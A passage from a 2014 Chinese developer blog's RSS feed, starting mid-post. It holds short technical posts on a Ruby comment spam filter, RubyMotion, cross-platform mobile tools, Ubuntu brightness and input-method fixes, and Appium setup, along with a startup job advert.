  transform: scale(1.1);
}
&lt;/pre&gt;
&lt;p&gt;3. add 'grow' to your div's class:&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;lt;a class="button grow"&amp;gt;Add to Basket&amp;lt;/a&amp;gt;&lt;/p&gt;
</description>
      <pubDate>Sun, 05 Oct 2014 00:11:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/css-css-menu-effects</link>
    </item>
    <item>
      <title>为自己的blog增加了 垃圾留言的过滤功能（add spam-filter for my blog-comments) </title>
      <description>&lt;p&gt;自己的博客搭建起很久了（接近2年），中间断过3,4个月。后来从今年7月份开始稳定。现在每天都有很多爬虫，机器人过来抓东西，写东西。&amp;#160;&lt;/p&gt;
&lt;p&gt;几天不整理，垃圾留言就达到上万条。&amp;#160;&lt;/p&gt;
&lt;p&gt;于是就写了个屏蔽垃圾留言的功能。其实很简单：符合下面三个特点的，99%是垃圾留言：&lt;/p&gt;
&lt;p&gt;1。 包含： http://&lt;/p&gt;
&lt;p&gt;2. &amp;#160; 包含： &amp;#160;https://&lt;/p&gt;
&lt;p&gt;3. &amp;#160; 包含： &amp;#160;href=&lt;/p&gt;
&lt;p&gt;解决办法很简单，加个 customized validation: &amp;#160;见：&lt;a href="https://github.com/sg552/siwei.me/commit/ef5b4b606cbb30f646112fa397f5f2b4c062b257"&gt;https://github.com/sg552/siwei.me/commit/ef5b4b606cbb30f646112fa397f5f2b4c062b257&lt;/a&gt;
&lt;/p&gt;
&lt;pre&gt;class Comment &amp;lt; .....
+      validate :should_not_contain_spam_keywords
+      def should_not_contain_spam_keywords
+        if body.include?('http://') || body.include?('https://') || body.include?('href=')
+          errors.add :body, 'http://, https://, href= are spam keywords..., are you a robot?'
+        end
+      end
end
&lt;/pre&gt;
&lt;p&gt;后记： 观察了好几天，一条垃圾留言都没有了。 ^_^ &amp;#160;&lt;/p&gt;</description>
      <pubDate>Sat, 04 Oct 2014 13:22:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/blog-add-spam-filter-for-my-blog-comments</link>
    </item>
    <item>
      <title>北京 乐单软件公司( happymenu )招全栈攻城师！</title>
      <description>&lt;p&gt;北京 乐单软件公司招全栈攻城师！&lt;/p&gt;
&lt;p&gt;大家好~ 北京乐单软件有限公司 (&lt;a href="http://happymenu.cn" target="_blank"&gt;http://happymenu.cn&lt;/a&gt;) 由于业务快速增长，需要给力的小伙伴们的加入~&lt;/p&gt;
&lt;p&gt;我们是初创公司，有一个比较稳定的小团队。我是合伙人之一。全盘负责技术。我们有着宽敞明亮的办公室， 地址在三元桥地铁站附近的霄云中心~&lt;/p&gt;
&lt;p&gt;公司的业务是： web相关，移动互联网方向。&lt;/p&gt;
&lt;p&gt;由于业务的快速增加，我们需要给力的伙伴加入我们。要求狠简单：&lt;/p&gt;
&lt;h1 class="hightlight"&gt;只要你聪明&lt;/h1&gt;
&lt;p&gt;对工作经验没有要求~ 应届生们还在等什么！&lt;/p&gt;
&lt;p&gt;要做的事情： &lt;br /&gt;1.  以ruby开发为主， 包括使用ruby开发web, 开发android, 开发ios&lt;/p&gt;
&lt;p&gt;我们也会要求你用 js开发， 用 swift开发. 视情况而定。&lt;br /&gt;而工作的内容不仅限于web开发，也要做android, ios。  &lt;/p&gt;
&lt;p&gt;对于生僻的知识，你也不用怕。我们有永远有耐心的CTO手把手的教你，跟你结对编程。我们相信你是足够聪明的。&lt;/p&gt;
&lt;p&gt;公司会为大家定期组织技术培训，让新人尽快融入团队~ 让老员工有更好的提升台阶！～&amp;#160;&lt;/p&gt;
&lt;p&gt;待遇： &lt;br /&gt;目前每年12薪，7K～ 15K。视能力而定。&lt;br /&gt;工资会随着能力的提高而调整。 半年一次。&lt;br /&gt;有项目奖金。&lt;/p&gt;
&lt;p&gt;欢迎感兴趣的同学投递简历到 : siwei@happymenu.cn &amp;#160; &amp;#160;&lt;/p&gt;
&lt;p&gt;最好：附上你的 github, stackoverflow 和个人博客等地址～ &amp;#160; &amp;#160;&lt;/p&gt;
&lt;p&gt;下面上真相～&lt;/p&gt;
&lt;p&gt;公司在三元桥地铁站附近的 霄云中心 310：&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmSSIoMjAxNC8xMC8wMi8yMV8xM181M183NF9EU0MwMDczNS5KUEcGOgZFVFsIOgZwOgp0aHVtYkkiDTQ1MHg0NTA+BjsGRg/DSC00735.JPG" title="Dsc00735" alt="Dsc00735" rel="450x450" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmSSIpMjAxNC8xMC8wMi8yMV8xMF8xNV80NjFfRFNDMDA3MzQuSlBHBjoGRVRbCDoGcDoKdGh1bWJJIg00NTB4NDUwPgY7BkY/DSC00734.JPG" title="Dsc00734" alt="Dsc00734" rel="450x450" width="450.39999997615814" height="299.39999997615814" /&gt;&lt;/p&gt;
&lt;p&gt;办公室进门之后（从西向东看）&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmSSIpMjAxNC8xMC8wMi8yMV8xNl8wMV85NDFfRFNDMDA3NTkuSlBHBjoGRVRbCDoGcDoKdGh1bWJJIg00NTB4NDUwPgY7BkY/DSC00759.JPG" title="Dsc00759" alt="Dsc00759" rel="450x450" width="450.39999997615814" height="299.39999997615814" /&gt;&lt;/p&gt;
&lt;p&gt;从东向西看：&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmSSIpMjAxNC8xMC8wMi8yMV8xNl8wMF83MDFfRFNDMDA3NTYuSlBHBjoGRVRbCDoGcDoKdGh1bWJJIg00NTB4NDUwPgY7BkY/DSC00756.JPG" title="Dsc00756" alt="Dsc00756" rel="450x450" width="450.39999997615814" height="299.39999997615814" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmSSIpMjAxNC8xMC8wMi8yMV8xNl8wMV81MDRfRFNDMDA3NTguSlBHBjoGRVRbCDoGcDoKdGh1bWJJIg00NTB4NDUwPgY7BkY/DSC00758.JPG" title="Dsc00758" alt="Dsc00758" rel="450x450" width="450.39999997615814" height="299.39999997615814" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmSSIpMjAxNC8xMC8wMi8yMV8xNl8wMV8xMDBfRFNDMDA3NTcuSlBHBjoGRVRbCDoGcDoKdGh1bWJJIg00NTB4NDUwPgY7BkY/DSC00757.JPG" title="Dsc00757" alt="Dsc00757" rel="450x450" width="450.39999997615814" height="299.39999997615814" /&gt;&lt;/p&gt;
&lt;p&gt;我们的会议室，白板 大桌子～&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmSSIpMjAxNC8xMC8wMi8yMV8xOF81OF80MjVfRFNDMDA3NjQuSlBHBjoGRVRbCDoGcDoKdGh1bWJJIg00NTB4NDUwPgY7BkY/DSC00764.JPG" title="Dsc00764" alt="Dsc00764" rel="450x450" width="450.39999997615814" height="299.39999997615814" /&gt;&lt;/p&gt;
&lt;p&gt;沙发， 中午可以休息～&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmSSIpMjAxNC8xMC8wMi8yMV8xOF81N183ODVfRFNDMDA3NjIuSlBHBjoGRVRbCDoGcDoKdGh1bWJJIg00NTB4NDUwPgY7BkY/DSC00762.JPG" title="Dsc00762" alt="Dsc00762" rel="450x450" width="450.39999997615814" height="299.39999997615814" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmSSIoMjAxNC8xMC8wMi8yMV8xOF81OF85N19EU0MwMDc2My5KUEcGOgZFVFsIOgZwOgp0aHVtYkkiDTQ1MHg0NTA+BjsGRg/DSC00763.JPG" title="Dsc00763" alt="Dsc00763" rel="450x450" width="450.39999997615814" height="299.39999997615814" /&gt;&lt;/p&gt;</description>
      <pubDate>Sat, 04 Oct 2014 02:06:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/happymenu</link>
    </item>
    <item>
      <title>rubymotion在运行时的过程分析: 2. Object C interface（ rubymotion at run-time : object c interface) </title>
      <description>
&lt;p&gt;Object C 定义方法的例子：&lt;/p&gt;

&lt;pre&gt;# define instance method
@class Foo
- (id)foo;
@end

# class method: 
@class Foo
+ (id)foo;
@end

&lt;/pre&gt;
&lt;p&gt;Object C 定义一个方法：sharedInstanceWithObject:andObject  &lt;/p&gt;
&lt;pre&gt;@class Test
+ (id)sharedInstanceWithObject:(id)obj1 andObject:(id)obj2;
@end
&lt;/pre&gt;

&lt;p&gt; 如何在 rubymotion中调用它呢？ &lt;/p&gt;
&lt;pre&gt;instance = Test.sharedIntanceWithObject(obj1, andObject:obj2)
&lt;/pre&gt;
&lt;p&gt;RubyMotion还提供了某些 selector: 的简化;&lt;/p&gt;
&lt;pre&gt;Object C:                RubyMotion
setFoo:                  foo = 
isFoo                    foo?
objectForKey:            []
setObject:forKey:        []=

# 下面是一个使用例子：(view 是 UIView的一个instance) 
view.hidden = true unless view.hidden?&lt;/pre&gt;
&lt;p&gt;关于  Super:  关键字： &lt;/p&gt;
&lt;pre&gt;# 下面的 OC代码是 在 VideoController的  play方法中，调用 MediaController的 play 方法:
@interface VideoController : MediaController
@end

@implementation VideoController
- (void)play:(NSString *)song {
  [super play:song];
  // Customize here...
}
@end

# 对应的 ruby 代码如下：
class VideoController &amp;lt; MediaController
  def play(song)
    # 这里用的是 super, 而不是super() . 因为需要调用“同样的参数给super" 
    super  
    # Customize here...
  end
end
&lt;/pre&gt;</description>
      <pubDate>Thu, 02 Oct 2014 01:01:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rubymotion-2-object-c-interface-rubymotion-at-run-time-object-c-interface</link>
    </item>
    <item>
      <title>rubymotion在运行时的过程分析:  1. Message（ rubymotion at run-time : message)</title>
      <description>&lt;p&gt;refer to: &lt;a href="http://www.rubymotion.com/developer-center/guides/runtime/#_ios_and_os_x"&gt;http://www.rubymotion.com/developer-center/guides/runtime/#_ios_and_os_x&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;ruby 和 object c 都是受了smalltalk的极大影响。在语言构成上的也比较类型： 所有的类都是继承一个基本的类. single inheritance 等。&lt;/p&gt;
&lt;p&gt;rubymotion 是使用了 &amp;#160;object-c 的runtime 来实现了ruby语言，所以 可以直接调用 object c 的东东。&lt;/p&gt;
&lt;p&gt;在 rubymotion中， ruby class 对应 object c class, ruby method 对应 object c method, &amp;#160;反之亦然。&lt;/p&gt;
&lt;p&gt;我们可以比较下两者的代码：&lt;/p&gt;
&lt;p&gt;Object C的代码：&lt;/p&gt;
&lt;pre&gt;[string drawAtPoint:point withFont:font];
&lt;/pre&gt;
&lt;p&gt;Ruby: (RubyMotion) :&lt;/p&gt;
&lt;pre&gt;
string.drawAtPoint(point, withFont:font)
# 或者
string.send(:'drawAtPoint:withFont:', point, font)
&lt;/pre&gt;</description>
      <pubDate>Wed, 01 Oct 2014 23:23:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rubymotion-1-message-rubymotion-at-run-time-message</link>
    </item>
    <item>
      <title>总有语言想一统江湖 (history of cross-platform languages )</title>
      <description>&lt;p&gt;程序世界就好比一个江湖。&amp;#160;&lt;/p&gt;
&lt;p&gt;每个语言都是一个门派。&lt;/p&gt;
&lt;p&gt;C/C++ 就是 少林派。 Java是武当派。 .NET是峨眉派。 还有PHP, RUBY, ERLANG, GO, NODEJS..。。python....&lt;/p&gt;
&lt;p&gt;每个门派的人，都希望自己的武功能到哪里都是老大。&lt;/p&gt;
&lt;p&gt;程序世界也是如此。 做JAVA的人，希望IOS,BLACKBERRY 也用JAVA开发。&lt;/p&gt;
&lt;p&gt;做C/C++的人，希望网页也用C、C++开发。 &amp;#160;&lt;/p&gt;
&lt;p&gt;C刚出现的时候， 就宣称自己是跨平台的。LINUX上也可以用C写， WINDOWS上也可以用C写。&lt;/p&gt;
&lt;p&gt;当初JAVA 出现的时候也是这样， J2EE —— 针对企业， J2SE —— 标准版, J2ME —— 针对移动设备（这些年也看不到了）&lt;/p&gt;
&lt;p&gt;而WEB刚出现的时候，还有很多 JAVA GUI的技术，希望能被移植到web上。比如有个项目就是希望把swing做到web 页面中。达到在web端显示的目的。&lt;/p&gt;
&lt;p&gt;现在，在移动互联网越来越火的时代，大家纷纷表示不服。 用java的同学希望 ios也用java （如果他们有余力的从spring， SSH中脱离出来的话）, &amp;#160;ruby的同学也希望所有的平台都用ruby来做。&lt;/p&gt;
&lt;p&gt;比如 phonegap, titanium, rubymotion, 等等。&lt;/p&gt;
&lt;p&gt;实际上不太可能。 web 应用 跟 桌面应用完全是两个东西（想想html， css 跟 GUI的区别）。而 mobile app跟 web app又完全是两个东西（想想web中如何会用到摄像头 ）。 phonegap, node-webkit 是 hybrid (混杂型应用）， titanium走上了 java 虚拟机的老路—— 快速做出产品原型没问题，但是运行速度堪忧， &amp;#160; rubymotion 可以做出ios应用，但是对于支持安卓，跟 ruboto相比完全没优势，而且 在rubymotion中， 安卓的代码跟 ios的代码完全是独立的。&lt;/p&gt;
&lt;p&gt;所以，仍然是： 没有银弹! ！想要用锤子拧螺丝是不行的。 螺丝刀这个工具就是需要学习使用的。 想开发IOS 原生程序，就要用 object-c/swift/rubymotion, 想开发 安卓原生程序就要用 c/java/ruboto, 想开发web就要学习 HTML/CSS。&amp;#160;&lt;/p&gt;</description>
      <pubDate>Wed, 01 Oct 2014 15:16:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/history-of-cross-platform-languages</link>
    </item>
    <item>
      <title>rubymotion 极速入门 (rubymotion guide)</title>
      <description>&lt;p&gt;想在 ios开发中用ruby &amp;#160;? &amp;#160;很简单。用rubymotion.&lt;/p&gt;
&lt;p&gt;refer to: &lt;a href="http://www.rubymotion.com/developer-center/guides/getting-started"&gt;http://www.rubymotion.com/developer-center/guides/getting-started&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;1. 安装 xcode, 安装 command line tools&lt;/p&gt;
&lt;p&gt;2. 安装 rubymotion (下载zip 文件，输入 注册码，安装）&lt;/p&gt;
&lt;p&gt;3. 开始 hello world:&lt;/p&gt;
&lt;pre&gt;$ motion create MotionHello  
$ cd MotionHello
&lt;/pre&gt;
&lt;p&gt;可以看到 Rakefile等各种文件: &lt;/p&gt;
&lt;pre&gt;apple@mac:/sg552/workspace/MotionHello$ ls
Gemfile		Rakefile	build		spec
Gemfile.lock	app		resources

Gemfile:  ruby gem 的定义文件。 
Rakefile:  rake 的定义文件。 每个motion项目都是rake驱动的。
build: 生成目标代码的目录
spec: 测试文件夹
app: 主要目录。里面是主要的IOS代码
resources: 用到的图片，MP3啥的。
&lt;/pre&gt;
&lt;p&gt;然后，输入： $ rake, 就会看到：&amp;#160;&lt;/p&gt;
&lt;pre&gt;     Build ./build/iPhoneSimulator-8.0-Development
   Compile ./app/app_delegate.rb
    Create ./build/iPhoneSimulator-8.0-Development/MotionHello.app
      Link ./build/iPhoneSimulator-8.0-Development/MotionHello.app/MotionHello
    Create ./build/iPhoneSimulator-8.0-Development/MotionHello.app/PkgInfo
    Create ./build/iPhoneSimulator-8.0-Development/MotionHello.app/Info.plist
      Copy ./resources/Default-568h@2x.png
    Create ./build/iPhoneSimulator-8.0-Development/MotionHello.dSYM
  Simulate ./build/iPhoneSimulator-8.0-Development/MotionHello.app
&lt;/pre&gt;
&lt;p&gt;接下来显示一个黑屏。。。。 因为我们没有写任何代码，所以看到的app 中啥内容都没有。&lt;/p&gt;
&lt;p&gt;最后，我们修改 app/app_delegate.rb :&amp;#160;&lt;/p&gt;
&lt;pre&gt;  1 class AppDelegate
  2   def application(application, didFinishLaunchingWithOptions:launchOptions)
  3       alert= UIAlertView.new
  4       alert.message = "hi , siwei~"
  5       alert.show
  6       true
  7   end
  8 end
&lt;/pre&gt;
&lt;p&gt; 然后运行： $rake , 就会看到 内容在 模拟器中出现了~ : &lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJNMjAxNC8xMC8wNC8wN18zNl8xNV80MjlfaU9TX1NpbXVsYXRvcl9TY3JlZW5fU2hvdF8yMDE0XzEwXzFfMTEuNDMuMjUucG5nBjoGRVQ/iOS%20Simulator%20Screen%20Shot%202014%E5%B9%B410%E6%9C%881%E6%97%A5%20%E4%B8%8B%E5%8D%8811.43.25.png" title="I Os Simulator Screen Shot 2014年10月1日 下午11.43.25" alt="I Os Simulator Screen Shot 2014年10月1日 下午11.43.25" rel="225x255" width="750.3999999761581" height="1334.3999999761581" /&gt;&lt;/p&gt;
</description>
      <pubDate>Wed, 01 Oct 2014 15:14:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rubymotion-rubymotion-guide</link>
    </item>
    <item>
      <title>mobile app开发工具介绍——不仅仅只有android + ios (coding languages beyond android and ios )</title>
      <description>&lt;p&gt;refer to:&amp;#160;&lt;/p&gt;
&lt;p&gt;1.&amp;#160;&lt;a href="http://altabel.wordpress.com/2013/04/01/what-mobile-framework-to-choose-phonegap-sencha-titanium-jquery-mobile"&gt;http://altabel.wordpress.com/2013/04/01/what-mobile-framework-to-choose-phonegap-sencha-titanium-jquery-mobile&lt;/a&gt;, &lt;br /&gt;
2.&amp;#160;&lt;a href="https://signalvnoise.com/posts/3432"&gt;Why I loved building Basecamp for iPhone in RubyMotion&lt;/a&gt;
&lt;br /&gt;3.&amp;#160;&lt;/span&gt;
&lt;a href="http://www.reddit.com/r/ruby/comments/1aak6e/is_rubymotion_a_good_idea_if_were_a_ruby_shop_and/" style="background-color: transparent;"&gt;http://www.reddit.com/r/ruby/comments/1aak6e/is_rubymotion_a_good_idea_if_were_a_ruby_shop_and/&lt;/a&gt;
&lt;br /&gt;4.&amp;#160;&lt;a href="http://www.infoq.com/presentations/Cross-Platform-Mobile" style="background-color: transparent;"&gt;http://www.infoq.com/presentations/Cross-Platform-Mobile&lt;/a&gt;
&lt;br /&gt;5.&amp;#160;&lt;a href="http://www.appcelerator.com/titanium/" style="background-color: transparent;"&gt;http://www.appcelerator.com/titanium/&lt;/a&gt;&amp;#160;（注意看里面的video )&amp;#160;&lt;/p&gt;
&lt;p&gt;一直以来，各个平台不独立是开发人员的噩梦。要么是android, 要么是ios, 要么是blackberry... 很难找到一个coder可以搞多个app平台的情况。&lt;/p&gt;
&lt;p&gt;不过，程序员们一直没有放弃努力。下面是几款 支持多平台的工具：&lt;/p&gt;
&lt;p&gt;1. rubymotion: &amp;#160;macruby的作者的作品，基本是靠他一个人的力量完成的。目前可以用RUBY代码支持生成 native ios app. 而android的支持也进入了beta版。一旦成功，马上将会取代 ruboto. (个人认为）&lt;/p&gt;
&lt;p&gt;2. ruboto: &amp;#160;ruby on android. &amp;#160;我们在android开发时不再使用ruby代码。&amp;#160;&lt;/p&gt;
&lt;p&gt;3. titanium: 使用js + xml 书写，运行于所有平台。 比较好的是，titanium 会根据不同的平台生成自身的native code . 而不是hybrid app ( 混合型 ? 杂交型？ app) &amp;#160;，它是 目前 rubymotion的强有力竞争对手。 而且它是免费的。 唯一的劣势（对我来说）是使用了 js 而不是ruby. &amp;#160; &amp;#160;&lt;/p&gt;
&lt;p&gt;4. phone gap, &amp;#160;Jquery mobile, Sencha Touch: 支持所有平台，但本质是hybrid app. 也就是说，实际上就是 web app on mobile . &amp;#160;运行速度是硬伤。&lt;/p&gt;
&lt;p&gt;5. &amp;#160;对于不会编程的朋友，GameSalad 可以让你各种拖拽来生成app, &amp;#160;BusinessApps也有同样的作用。&amp;#160;&lt;/p&gt;</description>
      <pubDate>Mon, 29 Sep 2014 12:45:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/mobile-app-android-ios-coding-languages-beyond-android-and-ios</link>
    </item>
    <item>
      <title>几个mobile development非常重要的技术 ( important development tools )</title>
      <description>&lt;p&gt;titanium : 多平台下统一开发的工具。 &lt;a href="http://www.appcelerator.com/titanium/"&gt;http://www.appcelerator.com/titanium/&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;rubymotion: 使用ruby开发 ios app + android app &lt;a href="http://www.rubymotion.com/getting-started/"&gt;http://www.rubymotion.com/getting-started/&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;想想我就想笑了：） &amp;#160;&lt;/p&gt;</description>
      <pubDate>Mon, 29 Sep 2014 06:27:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/mobile-development-important-development-tools</link>
    </item>
    <item>
      <title>google account失效后 stackoverflow 的拯救办法（save your stackoverflow account when you google account is disabled ) </title>
      <description>&lt;p&gt;昨天很郁闷，发现自己的google account无法再使用。 写信申诉，对方是机器人回复的，说我的账户已经被撤销，无法恢复。建议我重新申请。 我重新申请的时候，发现又无法使用原有的账户。&lt;/p&gt;
&lt;p&gt;还好，自己的邮件( sg552sg552@gmail.com ) 中没有什么东西。 &amp;#160;比较重要的是stackoverflow的帐号，已经6000分了啊～&lt;/span&gt;
&lt;/p&gt;&lt;p&gt;于是，今天来到公司，办公室的浏览器中还有cookie, 于是打开， 看到了自己的帐号还在登录状态：&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wOS8yOS8xNF8xOF8zNV8zOTlfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDlfMjlfMTFfNDlfMjIucG5nBjoGRVQ/Screenshot%20from%202014-09-29%2011png:22.:ext" title="Screenshot From 2014 09 29 11:49:22" alt="Screenshot From 2014 09 29 11:49:22" width="1280" height="800" /&gt;&lt;/p&gt;
&lt;p&gt;接下来的事情就简单了：&lt;/p&gt;
&lt;p&gt;1. 点击自己的右上角头像&lt;/p&gt;
&lt;p&gt;2. &amp;#160;在 "flair, apps, my logins"标签中，点击 "my logins"&lt;/p&gt;
&lt;p&gt;3. 在弹出的窗口中，点击 &amp;#160;" add more logins"&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wOS8yOS8xNF8yMV8yM181OTFfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDlfMjlfMTRfMjFfNDcucG5nBjoGRVQ/Screenshot%20from%202014-09-29%2014png:47.:ext" title="Screenshot From 2014 09 29 14:21:47" alt="Screenshot From 2014 09 29 14:21:47" rel="225x255" width="1280" height="800" /&gt;&lt;/p&gt;
&lt;p&gt;4. 于是选择一种， facebook, yahoo ...等等。我用的是 stackexchange（新注册了一个）。 现在心里踏实多了～～&lt;/p&gt;</description>
      <pubDate>Mon, 29 Sep 2014 06:15:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/google-account-stackoverflow-save-your-stackoverflow-account-when-you-google-account-is-disabled</link>
    </item>
    <item>
      <title>ubuntu14 下调整显示器亮度（change the brightness of your screen in ubuntu14) </title>
      <description>&lt;p&gt;refer to :&lt;a href="http://itsfoss.com/fix-brightness-ubuntu-1310/"&gt;http://itsfoss.com/fix-brightness-ubuntu-1310/&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;安装完ubuntu14后发现屏幕亮度无法调节？别怕，这是一个已知的bug（只要你的是 intel的显卡，就肯定会出现这个问题）&lt;/p&gt;
&lt;p&gt;1. 确定你用的是intel 显卡： &amp;#160;&lt;/p&gt;
&lt;p&gt;$ ls /sys/class/backlight ,&lt;/p&gt;
&lt;p&gt;intel-backlight&amp;#160;&lt;/p&gt;
&lt;p&gt;2. $ 新增文件：&amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;$ sudo touch /usr/share/X11/xorg.conf.d/20-intel.conf&lt;br /&gt;$ sudo vim /usr/share/X11/xorg.conf.d/20-intel.conf&lt;/p&gt;
&lt;p&gt;内容为：&lt;/p&gt;
&lt;pre&gt;Section "Device"
    Identifier "card0"
    Driver "intel"
    Option "Backlight" "intel_backlight"
    BusID "PCI:0:2:0"EndSection
&lt;/pre&gt;
&lt;p&gt;退出，重新登陆即可。&lt;/p&gt;
&lt;p&gt;&lt;img src="http://itsfoss.itsfoss.netdna-cdn.com/wp-content/uploads/2014/03/Brightness_control_Ubuntu.jpeg" /&gt;&lt;/p&gt;</description>
      <pubDate>Sun, 28 Sep 2014 22:54:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ubuntu14-change-the-brightness-of-your-screen-in-ubuntu14</link>
    </item>
    <item>
      <title>appium的工作原理 ( how appium works)</title>
      <description>&lt;p&gt;基于 selenium的 WebDriver JSON wire 协议&lt;/p&gt;
&lt;p&gt;对于IOS，调用 ios的 UIAutomation 组件&lt;/p&gt;
&lt;p&gt;对于早期安卓平台 ( &amp;lt;= 2.2 )，调用安卓的 selendroid 组件&lt;/p&gt;
&lt;p&gt;对于较新的安卓平台( &amp;gt;= 2.3 )，调用 UiAutomator 框架。&lt;/p&gt;
&lt;p&gt;对于FirefoxOS, 也有一个叫做 leverages Marionette 的自动化测试框架（兼容WebDriver )&lt;/p&gt;
&lt;p&gt;英文版： 见官方文档&lt;/p&gt;
&lt;p&gt;Appium drives various native automation frameworks and provides an API based on Selenium's WebDriver JSON wire protocol.&lt;/p&gt;
&lt;p&gt;Appium drives Apple's UIAutomation library for iOS support, which is based on Dan Cuellar's work on iOS Auto.&lt;/p&gt;
&lt;p&gt;Android support uses the UiAutomator framework for newer platforms and Selendroid for older Android platforms.&lt;/p&gt;
&lt;p&gt;FirefoxOS support leverages Marionette, an automation driver that is compatible with WebDriver and is used to automate Gecko-based platforms.&lt;/p&gt;</description>
      <pubDate>Sat, 27 Sep 2014 02:23:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/appium-how-appium-works</link>
    </item>
    <item>
      <title>安装appium  ( install appium on linux-ubuntu) </title>
      <description>&lt;p&gt;安装前提：对于安卓测试，需要你提前安装好：JDK，ANT，ADT，ADB等安装开发必须的组件。&lt;/p&gt;
&lt;p&gt;1. install npm ( go to nodejs.org and download the tar.gz file)&lt;/p&gt;
&lt;p&gt;2. $ npm install -g appium&lt;/p&gt;
&lt;p&gt;3. $ npm install wd&lt;/p&gt;
&lt;p&gt;4. $appium （启动了appium的服务器端）&lt;/p&gt;
&lt;p&gt;5. 书写自己的 appium脚本，然后执行:&lt;/p&gt;
&lt;p&gt;$&amp;#160;node your-appium-test.js&lt;/p&gt;
&lt;p&gt;最后，还可以执行下列命令来检查是否安装完全：&amp;#160;&lt;/p&gt;
&lt;pre&gt;sg552@siwei-linux-notebook:/workspace/coding_tools$ appium-doctor 
Running Android Checks
✔ ANDROID_HOME is set to "/workspace/android-sdk-linux"
✔ JAVA_HOME is set to "/workspace/jdk1.7.0_67."
✔ ADB exists at /workspace/android-sdk-linux/platform-tools/adb
✔ Android exists at /workspace/android-sdk-linux/tools/android
✔ Emulator exists at /workspace/android-sdk-linux/tools/emulator
✔ Android Checks were successful.

✔ All Checks were successful

&lt;/pre&gt;</description>
      <pubDate>Sat, 27 Sep 2014 02:13:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/appium-install-appium-on-linux-ubuntu</link>
    </item>
    <item>
      <title>无线APP自动化测试工具的比较( comparison about mobile app automation test tools)</title>
      <description>&lt;p&gt;主要参考： &lt;a href="http://www.cnblogs.com/zzzhuxf/p/3860647.html"&gt;http://www.cnblogs.com/zzzhuxf/p/3860647.html&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;在web 开发中，测试工具是 selenium. &amp;#160;通杀所有语言。还有各个语言单独的自动化测试组件。 但是都不如selenium这位大哥。&lt;/p&gt;
&lt;p&gt;在mobile app开发中，测试工具主要有下面几种：&lt;/p&gt;
&lt;p&gt;1. selenium for android&lt;/p&gt;
&lt;p&gt;2. robotium&lt;/p&gt;
&lt;p&gt;3. appium&lt;/p&gt;
&lt;p&gt;基本上还是要使用appium, 它包含了 selenium for android,  &lt;br /&gt;
同时适用于 android, ios. 而且不必需要SDK，不需要重新编译。&lt;br /&gt;
适用于各种不同的语言（都有appium的lib ) &lt;br /&gt;
可以使用各种不同语言的测试框架&lt;br /&gt;
 &amp;#160;感兴趣的同学可以先看看appium.io 官方的两个视频。&lt;/p&gt;

&lt;p&gt;而且appium 处于活跃的开发状态， 正式的1.0版本已经发布，大家可以放心使用啦～ &amp;#160;&lt;/p&gt;
&lt;p&gt;refer to: &lt;a href="http://blog.csdn.net/u012565107/article/details/36419297"&gt;http://blog.csdn.net/u012565107/article/details/36419297&lt;/a&gt;,  &lt;a href="http://www.zhihu.com/question/19716849"&gt;http://www.zhihu.com/question/19716849&lt;/a&gt;
&lt;a href="http://www.tuicool.com/articles/m6jyMvJ"&gt;http://www.tuicool.com/articles/m6jyMvJ&lt;/a&gt; &lt;/p&gt;</description>
      <pubDate>Sat, 27 Sep 2014 02:06:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/app-comparison-about-mobile-app-automation-test-tools</link>
    </item>
    <item>
      <title>ubuntu 14下安装搜狗输入法 sogou input now support Linux (ubuntu14) </title>
      <description>&lt;p&gt;refer to: &lt;a href="http://pinyin.sogou.com/linux/help.php"&gt;http://pinyin.sogou.com/linux/help.php&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;for my ubuntu14:&lt;/p&gt;
&lt;p&gt;download &lt;a href="http://pinyin.sogou.com/linux/download.php?f=linux&amp;amp;bit=64"&gt;http://pinyin.sogou.com/linux/download.php?f=linux&amp;amp;bit=64&lt;/a&gt; and then double cllick to install ~&lt;/p&gt;
&lt;p&gt;但是之後你會發現自己的输入法是不生效的....&lt;/p&gt;
&lt;p&gt;所以参考: &lt;a href="http://askubuntu.com/questions/450255/installing-sogou-%E6%90%9C%E7%8B%97%E6%8B%BC%E9%9F%B3"&gt;http://askubuntu.com/questions/450255/installing-sogou-%E6%90%9C%E7%8B%97%E6%8B%BC%E9%9F%B3&lt;/a&gt;
